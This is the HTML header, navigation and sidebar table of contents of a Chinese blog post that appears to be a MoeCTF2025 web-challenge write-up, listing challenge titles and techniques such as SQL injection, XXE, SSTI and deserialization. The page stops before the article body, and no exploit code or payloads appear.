<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.ico">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"wanth3f1ag.top","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-dark","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
<script>
  (function () {
    var OriginTitle = document.title;
    var titleTime;
    document.addEventListener('visibilitychange', function () {
      if (document.hidden) {
        document.title = '坏人！看完了就想走' + OriginTitle;
        clearTimeout(titleTime);
      } else {
        document.title = '(*´∇｀*)你回来啦~' + OriginTitle;
        titleTime = setTimeout(function () {
          document.title = OriginTitle;
        }, 2000);
      }
    });
  })();
</script>

    <meta name="description" content="MoeCTF2025web题解">
<meta property="og:type" content="article">
<meta property="og:title" content="MoeCTF2025web题解">
<meta property="og:url" content="https://wanth3f1ag.top/2025/09/21/MoeCTF2025web%E9%A2%98%E8%A7%A3(%E5%B7%B2%E5%81%9A%E5%AE%8C)/index.html">
<meta property="og:site_name" content="root@wanth3f1ag">
<meta property="og:description" content="MoeCTF2025web题解">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/MoeCTF2025/image-20250921093811335.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/MoeCTF2025/image-20250921094629185.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/MoeCTF2025/image-20250921095008902.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/MoeCTF2025/image-20250923105303609.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/MoeCTF2025/image-20250921095641034.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/MoeCTF2025/image-20250921095915726.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/MoeCTF2025/image-20250923114447659.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/MoeCTF2025/image-20250923141643701.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/MoeCTF2025/image-20250923154512402.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/MoeCTF2025/image-20250923160251293.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/MoeCTF2025/image-20250923163035397.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/MoeCTF2025/image-20250923164037270.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/MoeCTF2025/image-20250923164313494.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/MoeCTF2025/image-20250923170701807.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/MoeCTF2025/image-20250923172753103.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/MoeCTF2025/image-20250924154223391.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/MoeCTF2025/image-20250924170239147.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/MoeCTF2025/image-20250924170619321.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/MoeCTF2025/image-20250924170755308.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/MoeCTF2025/image-20250924181348408.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/MoeCTF2025/image-20250921172629618.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/MoeCTF2025/image-20250921185531332.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/MoeCTF2025/image-20250921183738974.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/MoeCTF2025/image-20250921184601933.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/MoeCTF2025/image-20250925114232722.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/MoeCTF2025/image-20250925114413492.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/MoeCTF2025/image-20250925143531045.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/MoeCTF2025/image-20250925150709664.png">
<meta property="article:published_time" content="2025-09-21T01:28:09.000Z">
<meta property="article:modified_time" content="2025-12-01T11:12:09.266Z">
<meta property="article:author" content="wanTh3flag">
<meta property="article:tag" content="LitCTF2025">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/MoeCTF2025/image-20250921093811335.png">


<link rel="canonical" href="https://wanth3f1ag.top/2025/09/21/MoeCTF2025web%E9%A2%98%E8%A7%A3(%E5%B7%B2%E5%81%9A%E5%AE%8C)/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://wanth3f1ag.top/2025/09/21/MoeCTF2025web%E9%A2%98%E8%A7%A3(%E5%B7%B2%E5%81%9A%E5%AE%8C)/","path":"2025/09/21/MoeCTF2025web题解(已做完)/","title":"MoeCTF2025web题解"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>MoeCTF2025web题解 | root@wanth3f1ag</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>





  <script src="/js/third-party/pace.js" defer></script>


  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">root@wanth3f1ag</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">CTFer</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="s4arch" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-h0me"><a href="/" rel="section"><i class="home fa-fw"></i>H0me</a></li><li class="menu-item menu-item-a6out"><a href="/about/" rel="section"><i class="user fa-fw"></i>A6out</a></li><li class="menu-item menu-item-t6gs"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>T6gs</a></li><li class="menu-item menu-item-catagories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>Catagories</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="link fa-fw"></i>L1nks</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>s4arch
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="搜索..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0-Web%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="nav-number">1.</span> <span class="nav-text">0 Web入门指北</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#01-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E7%A5%9E%E7%A7%98%E7%9A%84%E6%89%8B%E9%95%AF"><span class="nav-number">2.</span> <span class="nav-text">01 第一章 神秘的手镯</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%AB%AFJS"><span class="nav-number">2.1.</span> <span class="nav-text">#前端JS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#01-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E7%A5%9E%E7%A7%98%E7%9A%84%E6%89%8B%E9%95%AF-revenge"><span class="nav-number">3.</span> <span class="nav-text">01 第一章 神秘的手镯_revenge</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2"><span class="nav-number">3.1.</span> <span class="nav-text">#备份文件泄露</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#02-%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E5%88%9D%E8%AF%86%E9%87%91%E6%9B%A6%E7%8E%84%E8%BD%A8"><span class="nav-number">4.</span> <span class="nav-text">02 第二章 初识金曦玄轨</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%93%8D%E5%BA%94%E6%8A%A5%E6%96%87"><span class="nav-number">4.1.</span> <span class="nav-text">#响应报文</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#03-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%97%AE%E5%89%91%E7%9F%B3%EF%BC%81%E7%AF%A1%E5%A4%A9%E6%94%B9%E5%91%BD%EF%BC%81"><span class="nav-number">5.</span> <span class="nav-text">03 第三章 问剑石！篡天改命！</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP%E4%BC%A0%E5%8F%82"><span class="nav-number">5.1.</span> <span class="nav-text">#HTTP传参</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#04-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E9%87%91%E6%9B%A6%E7%A0%B4%E7%A6%81%E4%B8%8E%E4%B8%83%E7%BB%9D%E5%82%80%E5%84%A1%E9%98%B5"><span class="nav-number">6.</span> <span class="nav-text">04 第四章 金曦破禁与七绝傀儡阵</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP%E8%AF%B7%E6%B1%82"><span class="nav-number">6.1.</span> <span class="nav-text">#HTTP请求</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#05-%E7%AC%AC%E4%BA%94%E7%AB%A0-%E6%89%93%E4%B8%8A%E9%97%A8%E6%9D%A5%EF%BC%81"><span class="nav-number">7.</span> <span class="nav-text">05 第五章 打上门来！</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="nav-number">7.1.</span> <span class="nav-text">#目录穿越</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#06-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E8%97%8F%E7%BB%8F%E7%A6%81%E5%88%B6%EF%BC%9F%E7%8E%84%E6%9C%BA%E5%88%9D%E6%8E%A2%EF%BC%81"><span class="nav-number">8.</span> <span class="nav-text">06 第六章 藏经禁制？玄机初探！</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="nav-number">8.1.</span> <span class="nav-text">#SQL注入万能密码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#07-%E7%AC%AC%E4%B8%83%E7%AB%A0-%E7%81%B5%E8%9B%9B%E6%8E%A2%E7%A9%B4%E4%B8%8E%E9%98%B4%E9%98%B3%E5%8F%8C%E7%94%9F%E7%AC%A6"><span class="nav-number">9.</span> <span class="nav-text">07 第七章 灵蛛探穴与阴阳双生符</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#robots%E6%96%87%E4%BB%B6-md5%E7%A2%B0%E6%92%9E"><span class="nav-number">9.1.</span> <span class="nav-text">#robots文件+md5碰撞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#08-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%A4%A9%E8%A1%8D%E7%9C%9F%E8%A8%80%EF%BC%8C%E6%98%9F%E5%9B%BE%E6%98%BE%E5%9C%A3"><span class="nav-number">10.</span> <span class="nav-text">08 第八章 天衍真言，星图显圣</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9B%B2%E6%B3%A8"><span class="nav-number">10.1.</span> <span class="nav-text">#SQL注入盲注</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#09-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E6%98%9F%E5%A2%9F%E7%A6%81%E5%88%B6%C2%B7%E5%A4%A9%E6%9C%BA%E9%97%AE%E8%B7%AF"><span class="nav-number">11.</span> <span class="nav-text">09 第九章 星墟禁制·天机问路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">11.1.</span> <span class="nav-text">#命令执行</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-%E7%AC%AC%E5%8D%81%E7%AB%A0-%E5%A4%A9%E6%9C%BA%E7%AC%A6%E9%98%B5"><span class="nav-number">12.</span> <span class="nav-text">10 第十章 天机符阵</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE"><span class="nav-number">12.1.</span> <span class="nav-text">#XXE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-%E7%AC%AC%E5%8D%81%E7%AB%A0-%E5%A4%A9%E6%9C%BA%E7%AC%A6%E9%98%B5-revenge"><span class="nav-number">13.</span> <span class="nav-text">10 第十章 天机符阵_revenge</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE%E8%BF%87%E6%BB%A4"><span class="nav-number">13.1.</span> <span class="nav-text">#XXE过滤</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E5%8D%83%E6%9C%BA%E5%8F%98%C2%B7%E7%A0%B4%E5%A6%84%E4%B9%8B%E7%9C%BC"><span class="nav-number">14.</span> <span class="nav-text">11 第十一章 千机变·破妄之眼</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%86%E7%A0%B4%E5%8F%82%E6%95%B0"><span class="nav-number">14.1.</span> <span class="nav-text">#爆破参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#12-%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AB%A0-%E7%8E%89%E9%AD%84%E7%8E%84%E5%85%B3%C2%B7%E7%A0%B4%E5%A6%84"><span class="nav-number">15.</span> <span class="nav-text">12 第十二章 玉魄玄关·破妄</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#eval%E5%87%BD%E6%95%B0"><span class="nav-number">15.1.</span> <span class="nav-text">#eval函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#13-%E7%AC%AC%E5%8D%81%E4%B8%89%E7%AB%A0-%E9%80%9A%E5%B9%BD%E5%85%B3%C2%B7%E7%81%B5%E7%BA%B9%E8%AF%A1%E5%BD%B1"><span class="nav-number">16.</span> <span class="nav-text">13 第十三章 通幽关·灵纹诡影</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0RCE"><span class="nav-number">16.1.</span> <span class="nav-text">#文件上传RCE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#14-%E7%AC%AC%E5%8D%81%E5%9B%9B%E7%AB%A0-%E5%BE%A1%E7%A5%9E%E5%85%B3%C2%B7%E8%A1%A5%E5%A4%A9%E7%8E%89%E7%A2%91"><span class="nav-number">17.</span> <span class="nav-text">14 第十四章 御神关·补天玉碑</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0RCE"><span class="nav-number">17.1.</span> <span class="nav-text">#配置文件上传RCE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#15-%E7%AC%AC%E5%8D%81%E4%BA%94%E7%AB%A0-%E5%BD%92%E7%9C%9F%E5%85%B3%C2%B7%E7%AB%9E%E6%97%B6%E5%87%80%E9%AD%94"><span class="nav-number">18.</span> <span class="nav-text">15 第十五章 归真关·竞时净魔</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0RCE-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="nav-number">18.1.</span> <span class="nav-text">#文件上传RCE+条件竞争</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#16-%E7%AC%AC%E5%8D%81%E5%85%AD%E7%AB%A0-%E6%98%86%E4%BB%91%E6%98%9F%E9%80%94"><span class="nav-number">19.</span> <span class="nav-text">16 第十六章 昆仑星途</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">19.1.</span> <span class="nav-text">#php文件包含</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#17-%E7%AC%AC%E5%8D%81%E4%B8%83%E7%AB%A0-%E6%98%9F%E9%AA%B8%E8%BF%B7%E9%98%B5%C2%B7%E7%A5%9E%E5%BF%B5%E9%87%8D%E6%9E%84"><span class="nav-number">20.</span> <span class="nav-text">17 第十七章 星骸迷阵·神念重构</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">20.1.</span> <span class="nav-text">#php反序列化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#18-%E7%AC%AC%E5%8D%81%E5%85%AB%E7%AB%A0-%E4%B8%87%E5%8D%B7%E8%AF%A1%E9%98%81%C2%B7%E5%8A%9F%E6%B3%95%E8%BF%9E%E7%8E%AF"><span class="nav-number">21.</span> <span class="nav-text">18 第十八章 万卷诡阁·功法连环</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1"><span class="nav-number">21.1.</span> <span class="nav-text">#php反序列化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#19-%E7%AC%AC%E5%8D%81%E4%B9%9D%E7%AB%A0-%E6%98%9F%E7%A9%B9%E7%9C%9F%E7%9B%B8%C2%B7%E8%A1%A5%E5%A4%A9%E5%BD%92%E6%BA%90"><span class="nav-number">22.</span> <span class="nav-text">19 第十九章 星穹真相·补天归源</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-2"><span class="nav-number">22.1.</span> <span class="nav-text">#php反序列化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#19-%E7%AC%AC%E5%8D%81%E4%B9%9D%E7%AB%A0-revenge"><span class="nav-number">23.</span> <span class="nav-text">19 第十九章_revenge</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-3"><span class="nav-number">23.1.</span> <span class="nav-text">#php反序列化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#20-%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AB%A0-%E5%B9%BD%E5%86%A5%E8%A1%80%E6%B5%B7%C2%B7%E5%B9%BB%E8%AF%AD%E5%BF%83%E9%AD%94"><span class="nav-number">24.</span> <span class="nav-text">20 第二十章 幽冥血海·幻语心魔</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SSTI%E6%97%A0%E8%BF%87%E6%BB%A4"><span class="nav-number">24.1.</span> <span class="nav-text">#SSTI无过滤</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#21-%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%80%E7%AB%A0-%E5%BE%80%E7%94%9F%E6%BC%A9%E6%B6%A1%C2%B7%E8%A8%80%E7%81%B5%E6%AD%BB%E5%B1%80"><span class="nav-number">25.</span> <span class="nav-text">21 第二十一章 往生漩涡·言灵死局</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SSTI-%E8%BF%87%E6%BB%A4"><span class="nav-number">25.1.</span> <span class="nav-text">#SSTI+过滤</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#22-%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E7%AB%A0-%E8%A1%80%E6%B5%B7%E6%A0%B8%E5%BF%83%C2%B7%E5%8D%83%E5%B9%B4%E6%89%8B%E6%AE%B5"><span class="nav-number">26.</span> <span class="nav-text">22 第二十二章 血海核心·千年手段</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BESSTI-%E6%8F%90%E6%9D%83"><span class="nav-number">26.1.</span> <span class="nav-text">#无回显SSTI+提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#23-%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%89%E7%AB%A0-%E5%B9%BB%E5%A2%83%E8%BF%B7%E5%BF%83%C2%B7%E7%9A%87%E9%99%A8%E6%98%9F%E6%B2%89-%E5%A4%A7%E7%BB%93%E5%B1%80"><span class="nav-number">27.</span> <span class="nav-text">23 第二十三章 幻境迷心·皇陨星沉(大结局)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">27.1.</span> <span class="nav-text">#java反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%80%E7%BB%88POC"><span class="nav-number">27.2.</span> <span class="nav-text">最终POC</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Moe%E7%AC%91%E4%BC%A0%E4%B9%8B%E7%8C%9C%E7%8C%9C%E7%88%86"><span class="nav-number">28.</span> <span class="nav-text">Moe笑传之猜猜爆</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%AB%AFJS-1"><span class="nav-number">28.1.</span> <span class="nav-text">#前端JS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%91%B8%E9%87%91%E5%81%B6%E9%81%87FLAG%EF%BC%8C%E6%8B%BC%E5%B0%BD%E5%85%A8%E5%8A%9B%E9%9A%BE%E6%88%98%E8%83%9C"><span class="nav-number">29.</span> <span class="nav-text">摸金偶遇FLAG，拼尽全力难战胜</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%AB%AFJS-2"><span class="nav-number">29.1.</span> <span class="nav-text">#前端JS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%99%E6%98%AF%E2%80%A6Webshell%EF%BC%9F"><span class="nav-number">30.</span> <span class="nav-text">这是…Webshell？</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE"><span class="nav-number">30.1.</span> <span class="nav-text">#无数字字母RCE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%99%E6%98%AF%E2%80%A6Webshell-revenge"><span class="nav-number">31.</span> <span class="nav-text">这是…Webshell?_revenge</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="wanTh3flag"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">wanTh3flag</p>
  <div class="site-description" itemprop="description">一条有梦想的咸鱼</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">182</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">27</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">121</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="/2323277194" title="qq → 2323277194" rel="noopener me"><i class="fab fa-qq fa-fw"></i>qq</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://wanth3f1ag.top/2025/09/21/MoeCTF2025web%E9%A2%98%E8%A7%A3(%E5%B7%B2%E5%81%9A%E5%AE%8C)/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="wanTh3flag">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="root@wanth3f1ag">
      <meta itemprop="description" content="一条有梦想的咸鱼">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
